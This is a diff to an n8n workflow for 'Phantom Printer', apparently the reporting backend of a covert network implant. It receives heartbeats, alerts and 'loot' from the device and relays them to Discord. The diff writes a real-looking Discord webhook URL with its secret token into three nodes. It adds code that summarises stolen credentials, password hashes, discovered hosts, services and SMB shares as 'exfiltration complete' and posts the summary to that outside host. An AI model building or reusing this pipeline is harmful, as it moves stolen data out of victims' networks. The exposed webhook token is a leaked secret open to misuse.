@@ -1,5 +1,5 @@
 {
-  "name": "Phantom Printer - Complete Dropbox Monitor",
+  "name": "Phantom Printer - Complete Dropbox Monitor (Fixed)",
   "nodes": [
     {
       "parameters": {
@@ -46,7 +46,7 @@
     {
       "parameters": {
         "method": "POST",
-        "url": "YOUR_DISCORD_WEBHOOK_URL",
+        "url": "https://discordapp.com/api/webhooks/1443782476282597466/rxU2Mz3jc95gKQLUKZzq4yi5d1HxsgxK_JtNMxa-wCXV93RZwGG7NDFeHzLo-wzqtZgC",
         "sendBody": true,
         "specifyBody": "json",
         "jsonBody": "={\n  \"embeds\": [{\n    \"title\": \"🖨️ Phantom Printer - Heartbeat\",\n    \"color\": 3066993,\n    \"fields\": [\n      {\n        \"name\": \"Dropbox ID\",\n        \"value\": \"{{ $json.body.dropbox_id || 'Unknown' }}\",\n        \"inline\": true\n      },\n      {\n        \"name\": \"IP Address\",\n        \"value\": \"{{ $json.body.ip_address || 'Unknown' }}\",\n        \"inline\": true\n      },\n      {\n        \"name\": \"Hostname\",\n        \"value\": \"{{ $json.body.hostname || 'Unknown' }}\",\n        \"inline\": true\n      },\n      {\n        \"name\": \"MAC Address\",\n        \"value\": \"{{ $json.body.mac_address || 'Unknown' }}\",\n        \"inline\": true\n      },\n      {\n        \"name\": \"Uptime\",\n        \"value\": \"{{ $json.body.uptime || 'Unknown' }}\",\n        \"inline\": true\n      },\n      {\n        \"name\": \"Load\",\n        \"value\": \"{{ $json.body.load || 'Unknown' }}\",\n        \"inline\": true\n      }\n    ],\n    \"timestamp\": \"{{ $now.toISO() }}\",\n    \"footer\": {\n      \"text\": \"Phantom Printer V2\"\n    }\n  }]\n}",
@@ -61,7 +61,7 @@
     {
       "parameters": {
         "method": "POST",
-        "url": "YOUR_DISCORD_WEBHOOK_URL",
+        "url": "https://discordapp.com/api/webhooks/1443782476282597466/rxU2Mz3jc95gKQLUKZzq4yi5d1HxsgxK_JtNMxa-wCXV93RZwGG7NDFeHzLo-wzqtZgC",
         "sendBody": true,
         "specifyBody": "json",
         "jsonBody": "={\n  \"embeds\": [{\n    \"title\": \"🚨 Phantom Printer - Alert\",\n    \"color\": {{ $json.body.level === 'critical' ? 15158332 : ($json.body.level === 'warning' ? 15105570 : 3447003) }},\n    \"fields\": [\n      {\n        \"name\": \"Alert Type\",\n        \"value\": \"{{ $json.body.type || 'Unknown' }}\",\n        \"inline\": true\n      },\n      {\n        \"name\": \"Level\",\n        \"value\": \"{{ $json.body.level || 'info' }}\",\n        \"inline\": true\n      },\n      {\n        \"name\": \"Dropbox ID\",\n        \"value\": \"{{ $json.body.dropbox_id || 'Unknown' }}\",\n        \"inline\": true\n      },\n      {\n        \"name\": \"Message\",\n        \"value\": \"{{ $json.body.message || 'No message' }}\",\n        \"inline\": false\n      }\n    ],\n    \"timestamp\": \"{{ $now.toISO() }}\",\n    \"footer\": {\n      \"text\": \"Phantom Printer V2\"\n    }\n  }]\n}",
@@ -75,18 +75,28 @@
     },
     {
       "parameters": {
+        "jsCode": "// Process loot data and build Discord embed\nconst body = $input.first().json.body;\n\n// Helper to safely get string and escape for JSON\nfunction safeStr(val, maxLen = 1000) {\n  if (!val) return 'None';\n  let str = String(val);\n  if (str.length > maxLen) {\n    str = str.substring(0, maxLen) + '...';\n  }\n  return str;\n}\n\n// Get stats with defaults\nconst stats = body.stats || {};\nconst hostsCount = stats.hosts || 0;\nconst credsCount = stats.credentials || 0;\nconst hashesCount = stats.hashes || 0;\n\n// Format hosts as comma-separated (cleaner for Discord)\nlet hostsStr = safeStr(body.hosts, 900);\n// Replace any newlines with comma-space\nhostsStr = hostsStr.replace(/\\n/g, ', ').replace(/, $/, '');\n\n// Format services\nlet servicesStr = safeStr(body.services, 900);\nservicesStr = servicesStr.replace(/\\n/g, ', ').replace(/, $/, '');\n\n// Format SMB shares\nlet smbStr = safeStr(body.smb_shares, 500);\nsmbStr = smbStr.replace(/\\n/g, ', ').replace(/, $/, '');\n\n// Build the Discord embed object properly\nconst discordPayload = {\n  embeds: [{\n    title: '💰 Phantom Printer - Loot Summary',\n    description: 'Reconnaissance and exfiltration complete',\n    color: 15844367,\n    fields: [\n      {\n        name: '🖥️ Hosts Discovered',\n        value: String(hostsCount),\n        inline: true\n      },\n      {\n        name: '🔑 Credentials',\n        value: String(credsCount),\n        inline: true\n      },\n      {\n        name: '🔐 Hashes',\n        value: String(hashesCount),\n        inline: true\n      },\n      {\n        name: '📋 Discovered Hosts',\n        value: hostsStr || 'None',\n        inline: false\n      },\n      {\n        name: '🌐 Common Services',\n        value: servicesStr || 'None',\n        inline: false\n      },\n      {\n        name: '📁 SMB Shares',\n        value: smbStr || 'None',\n        inline: false\n      }\n    ],\n    timestamp: new Date().toISOString(),\n    footer: {\n      text: `Phantom Printer V2 | ${body.dropbox_id || 'Unknown'}`\n    }\n  }]\n};\n\nreturn { json: discordPayload };"
+      },
+      "id": "loot-code",
+      "name": "Build Loot Embed",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [420, 740]
+    },
+    {
+      "parameters": {
         "method": "POST",
-        "url": "YOUR_DISCORD_WEBHOOK_URL",
+        "url": "https://discordapp.com/api/webhooks/1443782476282597466/rxU2Mz3jc95gKQLUKZzq4yi5d1HxsgxK_JtNMxa-wCXV93RZwGG7NDFeHzLo-wzqtZgC",
         "sendBody": true,
         "specifyBody": "json",
-        "jsonBody": "={\n  \"embeds\": [{\n    \"title\": \"💰 Phantom Printer - Loot Captured!\",\n    \"color\": 15844367,\n    \"fields\": [\n      {\n        \"name\": \"Loot Type\",\n        \"value\": \"{{ $json.body.type || 'Unknown' }}\",\n        \"inline\": true\n      },\n      {\n        \"name\": \"Dropbox ID\",\n        \"value\": \"{{ $json.body.dropbox_id || 'Unknown' }}\",\n        \"inline\": true\n      },\n      {\n        \"name\": \"Source\",\n        \"value\": \"{{ $json.body.source || 'Unknown' }}\",\n        \"inline\": true\n      },\n      {\n        \"name\": \"Data Preview\",\n        \"value\": \"```{{ ($json.body.data || 'No data').substring(0, 500) }}```\",\n        \"inline\": false\n      }\n    ],\n    \"timestamp\": \"{{ $now.toISO() }}\",\n    \"footer\": {\n      \"text\": \"Phantom Printer V2\"\n    }\n  }]\n}",
+        "jsonBody": "={{ JSON.stringify($json) }}",
         "options": {}
       },
       "id": "loot-discord",
       "name": "Discord Loot",
       "type": "n8n-nodes-base.httpRequest",
       "typeVersion": 4.2,
-      "position": [480, 740]
+      "position": [600, 740]
     },
     {
       "parameters": {
@@ -119,7 +129,7 @@
       "name": "Loot Response",
       "type": "n8n-nodes-base.respondToWebhook",
       "typeVersion": 1.1,
-      "position": [700, 740]
+      "position": [780, 740]
     }
   ],
   "connections": {
@@ -149,7 +159,7 @@
       "main": [
         [
           {
-            "node": "Discord Loot",
+            "node": "Build Loot Embed",
             "type": "main",
             "index": 0
           }
@@ -172,6 +182,17 @@
         [
           {
             "node": "Alert Response",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Build Loot Embed": {
+      "main": [
+        [
+          {
+            "node": "Discord Loot",
             "type": "main",
             "index": 0
           }
